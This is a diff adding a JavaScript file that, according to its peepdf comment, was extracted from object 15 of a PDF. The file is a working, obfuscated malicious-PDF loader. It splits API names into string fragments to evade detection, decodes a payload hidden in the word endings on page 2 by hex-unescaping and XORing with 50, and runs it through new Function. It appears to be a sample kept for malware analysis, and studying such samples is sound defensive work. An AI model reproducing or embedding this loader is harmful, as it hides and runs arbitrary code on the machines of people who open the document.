@@ -1,0 +1,33 @@
+// peepdf comment: Javascript code located in object 15 (version 0)
+
+var __s = '';
+var __getPage = 'ge' + 'tPage';
+var __delim = 'we%hlewdc';
+var __this = app.doc;
+__delim = __delim.substr(2, 1);
+
+var __getPageNthWord = __getPage + 'Nt' + 'hWord';
+var __getPageNumWords = __getPage + 'N' + 'umWords';
+
+var __fromCharCode = 'fr' + 'omCh' + 'arCode';
+var __charCodeAt = 'ch' + 'arCo' + 'deAt';
+
+var __nul = 0,
+    __two = 2,
+    __xor = 50;
+var __u = this['un' + 'es' + "cape"];
+
+new Function(__decode(2, __xor))();
+
+function __decode(__page, __xor) {
+
+    var __l = __this[__getPageNumWords](2);
+    for (var __i = 0; __i < __l; __i++) {
+        __word = __this[__getPageNthWord](__page, __i);
+        var __c = __word.substr(__word.length - __two, __two);
+        var __p = __u(__delim + __c)[__charCodeAt](__nul);
+        __s += String[__fromCharCode](__p ^ __xor);
+    }
+    return __s;
+}
+
